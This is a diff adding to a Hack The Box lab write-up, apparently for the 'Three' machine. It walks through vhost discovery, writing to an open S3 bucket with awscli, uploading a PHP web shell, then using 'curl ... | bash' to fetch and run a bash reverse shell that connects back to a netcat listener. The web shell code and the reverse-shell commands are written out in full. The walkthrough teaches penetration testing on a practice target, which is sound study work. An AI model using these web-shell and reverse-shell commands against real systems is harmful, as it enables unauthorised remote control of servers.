@@ -68,7 +68,61 @@ Even after changing `--resolver /etc/hosts`, I still couldn't get it to validate
 
 Looks like Virtual Hosts (VHost) scanning is what I was looking to find behind the domain. Let's try and resolve it in our /etc/hosts.
 
+<img width="484" height="238" alt="image" src="https://github.com/user-attachments/assets/c256fafe-022b-4810-97b6-d565bd68043c" />
 
+Because I can't resolve these domains by browsing to them, I need to (again) put them in my /etc/hosts file in order to populate my HTTP request's `Host: ` header in order to reach the resources: `sudo vim /etc/hosts`   
 
+<img width="710" height="253" alt="image" src="https://github.com/user-attachments/assets/04cce0da-b8a0-477c-9fa1-b7914386e028" />  
+
+<img width="820" height="265" alt="image" src="https://github.com/user-attachments/assets/e794e285-f87c-48c7-8257-694f0130c10f" />  
+
+www and mail resolve to the main page.
+
+<img width="817" height="210" alt="image" src="https://github.com/user-attachments/assets/655a7c54-18c4-44e5-a70e-843ccc554748" />   
+
+Well, we get something different with `http://s3.thetoppers.htb` it shows some json of {"Status": "running"}. After looking into s3 subdomains, it indicates that they're using a backend storage utility. From reading the [AWS user resources for accessing buckets](https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-bucket-intro.html), we can use the AWSCLI to try and interact with it remotely.
+
+Our resource specifies that we need to provide authentication creds with `aws configure`, but we don't have any... so let's try just supplying some fooey before requesting the s3 bucket virtual host link followed by `s3 ls` to list the buckets on this host.   
+
+<img width="750" height="172" alt="image" src="https://github.com/user-attachments/assets/73f83254-bb67-4523-84f6-9b422e2f2126" />   
+
+Now let's go ahead and look for stuff inside that bucket by specifying `s3://[bucketname]` at the end of our previous ls command.  
+
+<img width="589" height="102" alt="image" src="https://github.com/user-attachments/assets/9d293f9e-051f-42c0-b083-3e641ae1a8f9" />   
+
+A web access (.htaccess) file, index.php file, and images directory. Looks just like the results from our directory scan of the initial domain thetoppers.htb. This is most likely the root directory of that site stored in the cloud. I'd like to try getting access to a shell on this web server.
+
+Just like the `ls` command, the awscli has a `cp` command to allow us to upload files to s3 buckets. My thinking is that if we can get a file into this bucket, we can access/run it from the php website on the original domain.  
+
+`awscli http://s3.thetoppers.htb s3 cp [filename] s3://thetoppers.htb`  
+
+Now let's find a php shell file. I like the one from [Sente on github](https://gist.github.com/sente/4dbb2b7bdda2647ba80b).  
+- `<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>` in a fooey.php file.
+
+<img width="961" height="222" alt="image" src="https://github.com/user-attachments/assets/616fd0e1-318c-4aac-8845-680c88fc5816" />   
+
+It should be there now... let's browse and see if it works with "thetopper.htb/fooey.php?cmd=[system command]"
+
+<img width="751" height="158" alt="image" src="https://github.com/user-attachments/assets/7973945b-9b87-4205-a733-fb02ffcc4ebc" />
+
+<img width="709" height="291" alt="image" src="https://github.com/user-attachments/assets/950ee213-728c-489c-890e-feb66d46c006" />
+
+<img width="866" height="988" alt="image" src="https://github.com/user-attachments/assets/5d7b61c1-10c6-4c65-b4b7-069161c4a915" />
+
+Now let's go ahead and create and upload a bash reverse shell (bash -i >& /dev/tcp/10.10.14.128/1337 0>&1) that'll curl and execute (http://thetoppers.htb/fooey.php?cmd=curl 10.10.14.128:8000/shell.sh|bash) the shell file, which will create a reverse connection to a netcat listeer `nc -lvp 1337`
+
+<img width="696" height="143" alt="image" src="https://github.com/user-attachments/assets/7cdbc8f8-019e-479b-91e3-1857d1010a9f" />  
+
+<img width="659" height="240" alt="image" src="https://github.com/user-attachments/assets/d8969007-f2bd-4554-8b88-ad74fd67cb2b" />   
+
+And we'll need to start a python web server on our local machine (`python3 -m http.server 8000`) to host the bash shell to execute.
+
+<img width="656" height="557" alt="image" src="https://github.com/user-attachments/assets/e88707c9-f153-4aec-9f42-d3f0aa751dc9" />   
+
+And now that we execute 
+
+<img width="457" height="277" alt="image" src="https://github.com/user-attachments/assets/dc7f0a9f-b3a7-4a33-8957-05bdb7e3f1b5" />   
+
+<img width="511" height="489" alt="image" src="https://github.com/user-attachments/assets/8d143bdc-f376-42f6-850a-6a4143a7a67b" />   
 
 Note: Don’t submit the flag that appeared on my screen. It is unique to my account and will cause your account to be flagged for cheating.       
